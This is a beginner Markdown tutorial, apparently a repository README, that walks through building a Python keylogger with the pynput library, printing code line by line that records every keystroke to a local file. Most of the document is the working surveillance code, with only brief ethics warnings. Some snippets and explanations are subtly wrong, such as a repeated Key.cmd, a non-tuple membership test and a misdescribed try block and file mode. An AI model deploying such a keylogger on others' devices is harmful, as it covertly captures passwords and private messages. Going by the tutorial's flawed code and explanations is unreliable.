# Keylogger Tutorial

In this tutorial, I will show you how to build a Keylogger Program that can save every keystroke a user types into a device using python. If used unethically, this can be used to steal secure data, for which I caution you against doing. This will work on a MacBook but it will not save the data to a file for you to see, since MacOs is too powerful. Try this out on a Windows computer if you have one.

## Pre Requisites
For this code, you will need to install...
- [Py Charm Community](https://www.jetbrains.com/pycharm/download/#section=mac)
- [Python 3](https://www.python.org/downloads/)
- The Pynput Library(enter (pip3 install pynput) in your terminal, if it asks for a permissions problem, run (sudo pip3 install pynput)

## Let's write some code...

First, we will import the Listener and Key function from the part of the pynput library known as keyboard.
```
from pynput.keyboard import Listener, Key
```

Then we will create a function that will write the information that the computer captures to a file so that you can read it after running the code.
```
def write_to_file(key):
```

Now we will make a variable called key_data that we will use to add all of our captured key information. I will explain to you why we have the replace() function in a moment.
```
key_data = str(key).replace("'", "")
```

Now we are just printing the data for us to see in our console while we type anywhere else.
```
print(key_data)
```

Now here, we will have a print function which will use 0 as a placeholder to print the key inside the format() function. We have this so that we can check what someone types on our computer.
```
print('{0} release'.format(key))
```

Now we will create a if statement that will say that if the key pressed was escape.
```
if key == Key.esc:
```

Then we will print that they user entered escape.
```
print('entered escape')
```

Then we will return False. This ends the code, as escape is the key we will be using to show that the user is done typing, so it will end the Keylogger.
```
return False
```

Now we will create a series of is statements to record the special keys tapped.


If shift is pressed(the right or left one).
```
if key in (Key.shift, Key.shift_l, Key.shift_r,):
```

Add Shift + to key_data so that we will know what the typer capitalized.
```
key_data = ' Shift + '
```

If control is pressed(the right or left one).
```
if key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r,):
```

Add Ctrl + to key_data so that we will know what the typer put after control.
```
key_data = ' Ctrl + '
```

If command is pressed(the right or left one).
```
if key in (Key.cmd, Key.cmd, Key.cmd,):
```

Add Command + to key_data so that we will know what the typer put after command.
```
key_data = ' Command + '
```

If space is pressed.
```
if key in (Key.space,):
```

Add Space to key_data.
```
key_data = ' '
```

If enter is pressed.
```
if key in (Key.enter):
```

Add a newline to key_data.
```
key_data = '\n'
```

Now this is a new function we will be using to write the key_data into a file called try. This is basically as it seems, asking the computer to try to do something.
```
try:
```

Now we will open a file called listening.txt as a variable called fout.
```
with open('listening.txt', 'a') as fout:
```

Now we will write the key_data to that file so we can check it later.
```
fout.write(key_data)
```

Now if this listening.txt file is not fount and a FileNotFoundError is given, then...
```
except FileNotFoundError:
```

We will open a new file, substituting the a, which means to open a file as a file to write things to, with a w, which creates a new file if it does not exist.
```
with open('listening.txt', 'w') as fout:
```

Now we will write the key_data to that file so we can check it later.
```
fout.write(key_data)
```

Now we will utilize listener, that we imported in the starting of our code from the pynput library to, on the press of a key, to call the write to file function. We will open this as the variable listener.
```
with Listener(on_press=write_to_file) as listener:
```

We will return all of the keys clicked together by utilizing the join() function.
```
listener.join()
```

And there you have it, a Keylogger built by yourself! Please make sure to use this only with permission from the person you are using it on or it will be very unethical and morally wrong!

If you would like to download this code, click [here](Keylogger/logger.py).
